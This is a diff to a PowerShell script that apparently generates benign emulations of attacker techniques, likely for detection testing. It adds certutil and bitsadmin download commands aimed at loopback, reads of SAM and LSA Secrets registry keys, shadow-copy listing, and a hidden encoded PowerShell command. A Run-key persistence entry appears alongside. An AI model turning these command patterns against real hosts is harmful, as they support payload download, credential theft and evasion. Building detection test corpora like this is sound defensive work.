@@ -87,6 +87,44 @@ Start-Sleep -Milliseconds 300
 Remove-Item -Path $root -Recurse -Force
 '@
 
+$families['lolbin_certutil'] = @'
+# The signed binary used as a downloader. The request goes to loopback and
+# fails, which is the point: the command line is the evidence, and a family may
+# not reach the network to produce it.
+cmd /c "certutil -urlcache -f http://127.0.0.1/does-not-exist payload.exe" | Out-Null
+Start-Sleep -Milliseconds 300
+'@
+
+$families['lolbin_bitsadmin'] = @'
+cmd /c "bitsadmin /transfer wenle /download /priority normal http://127.0.0.1/does-not-exist C:\Windows\Temp\w.bin" | Out-Null
+Start-Sleep -Milliseconds 300
+'@
+
+$families['credential_recon'] = @'
+# Reads only: what an operator asks a machine before stealing anything.
+whoami /priv | Out-Null
+cmdkey /list | Out-Null
+reg query HKLM\SAM | Out-Null
+reg query "HKLM\SECURITY\Policy\Secrets" | Out-Null
+Start-Sleep -Milliseconds 300
+'@
+
+$families['shadow_list'] = @'
+# Read-only enumeration of the recovery copies; the deleting form is echoed in
+# `ransom_rename` and never executed.
+vssadmin list shadows | Out-Null
+wbadmin get versions | Out-Null
+Start-Sleep -Milliseconds 300
+'@
+
+$families['hidden_encoded'] = @'
+# A hidden window and an encoded command that only prints. The encoding is the
+# shape families use to keep the text out of the log; ours is harmless.
+$text = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output harmless'))
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $text | Out-Null
+Start-Sleep -Milliseconds 300
+'@
+
 $families['persistence_run'] = @'
 $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 Set-ItemProperty -Path $key -Name 'CorpusUpdater' -Value 'C:\Windows\System32\cmd.exe /c echo x'
